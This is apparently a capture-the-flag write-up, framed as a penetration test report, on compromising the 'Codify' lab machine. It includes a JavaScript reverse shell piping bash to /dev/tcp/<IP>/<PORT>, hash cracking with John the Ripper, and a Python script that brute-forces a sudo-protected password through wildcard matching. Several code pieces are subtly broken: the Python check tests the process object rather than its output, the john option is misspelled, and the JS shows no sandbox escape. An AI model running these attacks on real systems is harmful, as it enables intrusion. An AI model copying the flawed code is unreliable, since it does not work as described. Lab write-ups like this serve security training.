**Penetration Test Report: Codify Systems**

**1. Executive Summary:**

The Codify Systems penetration test was conducted to assess the security posture of the target system. The assessment uncovered multiple vulnerabilities, leading to unauthorized access and privilege escalation. The identified vulnerabilities include a misconfigured website, a known CVE, and an exploitable sudo configuration.

**2. Target Information:**

- **Target Name:** Codify
- **Target IP:** 10.10.11.239

**3. Scanning:**

A comprehensive Nmap scan revealed the following open ports:

```bash
nmap 10.10.11.239
```

- **22/tcp (SSH)**
- **80/tcp (HTTP)**
- **3000/tcp (Unidentified Service)**

**4. Website Analysis:**

Upon connecting to the website at `codify.htb`, it was discovered that the site contains an about section referencing a service named **"VM2."** Further investigation identified a potential vulnerability known as **"VM2 SandBox (CVE-2023-32214)."** This vulnerability allowed for the execution of a reverse shell payload.

**5. Exploitation:**

A GitHub repository was discovered containing a JavaScript code snippet for a reverse shell. Exploiting the CVE with this code successfully provided a reverse shell, granting access to the user account `svc@codify`.

```javascript
// Reverse_shell.js
const { exec } = require('node:child_process')

exec('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"', (err, result) => {
   if (err){
      console.error("Failed:", err)
      return
    }

console.log(result);})
```

**6. User Escalation:**

Upon gaining access to the user account, a password hash was found in the file `/var/www/contact/joshua.txt`. Using John the Ripper and the `rockyou.txt` password list, the password `spongebob1` was successfully cracked.

```bash
r00t3d@powerthecoder:~$ john --wordlists=rockyou.txt joshua.txt
```

With the obtained credentials (`joshua@codify.htb` and `spongebob1`), access to the user's home directory was achieved, and the user flag (`ff562135f253b8b1bd9261b89a93c6f8`) was retrieved.

**7. Privilege Escalation:**

Executing `sudo -l` revealed that the user was allowed to run the command `/opt/scripts/mysql-backup.sh` with sudo privileges. An investigation into the script exposed a wildcard vulnerability, enabling the extraction of characters from the password.

**8. Exploitation of Sudo Configuration:**

A custom Python script was crafted to exploit the wildcard vulnerability and brute-force the password one character at a time. The script successfully revealed the full password, allowing the user to execute the sudo command and escalate privileges.

```python
# r00t3d.py
import string
import subprocess

r00t3d = list(string.ascii_letters + string.digits)
passwd = ""
check_r00t3d = False

while not check_r00t3d:
    for i in r00t3d:
        cmd = f"echo '{passwd}{i}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        if "Password confirmed!" in output:
            passwd += i
            print(passwd)
            break
    else:
        check_r00t3d = True
```

**9. Root Access:**

With the escalated privileges, the user `joshua` executed `su` to become the root user. The root flag (`7edcb7d5085e52149c3ea3346073df1f`) was obtained.

**10. Recommendations:**

- Regularly update and patch software to address known vulnerabilities.
- Review and tighten sudo configurations to minimize potential abuse.
- Conduct periodic penetration testing to identify and remediate security weaknesses.

This report provides an overview of the penetration test conducted on the Codify Systems target. It is crucial to implement the recommended measures to enhance the overall security posture and mitigate potential risks.
